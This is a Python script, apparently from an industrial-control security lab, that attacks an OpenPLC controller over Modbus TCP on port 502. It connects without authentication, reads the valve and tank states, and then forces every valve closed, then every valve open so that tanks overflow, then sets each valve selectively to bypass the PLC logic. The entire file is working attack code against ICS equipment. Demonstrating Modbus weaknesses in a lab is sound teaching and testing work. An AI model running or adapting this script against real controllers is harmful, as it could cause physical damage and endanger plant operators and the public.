from pymodbus.client import ModbusTcpClient
import time

PLC = 'localhost'
PORT = 502

print("=" * 55)
print("  ATTACK 1: UNAUTHORIZED VALVE MANIPULATION")
print("  Target : OpenPLC port 502 (no auth required)")
print("=" * 55)

client = ModbusTcpClient(PLC, port=PORT)
if not client.connect():
    print("[ERROR] Cannot connect to PLC. Is OpenPLC running?")
    exit()

print("\n[+] Connected to PLC at {}:{}".format(PLC, PORT))

# Read current state
coils = client.read_coils(address=0, count=3)
tanks = client.read_holding_registers(address=1, count=3)
print(f"[*] Current valve states : V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print(f"[*] Current tank levels  : T1={tanks.registers[0]} T2={tanks.registers[1]} T3={tanks.registers[2]}")

print("\n[ATTACK] Step 1 — Force ALL valves CLOSED...")
client.write_coil(address=0, value=False)
client.write_coil(address=1, value=False)
client.write_coil(address=2, value=False)
time.sleep(1)

coils = client.read_coils(address=0, count=3)
print(f"[RESULT] Valve states after close: V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print("[RESULT] All valves CLOSED — tanks will stop filling even if below 80%!")

time.sleep(3)

print("\n[ATTACK] Step 2 — Force ALL valves OPEN...")
client.write_coil(address=0, value=True)
client.write_coil(address=1, value=True)
client.write_coil(address=2, value=True)
time.sleep(1)

coils = client.read_coils(address=0, count=3)
print(f"[RESULT] Valve states after open: V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print("[RESULT] All valves FORCED OPEN — tanks will overflow past 80%!")

time.sleep(3)

print("\n[ATTACK] Step 3 — Selective control: Open V1 only, close V2 and V3...")
client.write_coil(address=0, value=True)
client.write_coil(address=1, value=False)
client.write_coil(address=2, value=False)
time.sleep(1)

coils = client.read_coils(address=0, count=3)
print(f"[RESULT] V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print("[RESULT] Attacker has full individual valve control — PLC logic bypassed!")

client.close()
print("\n[DONE] Attack 1 complete. No authentication was required.")
print("="*55)
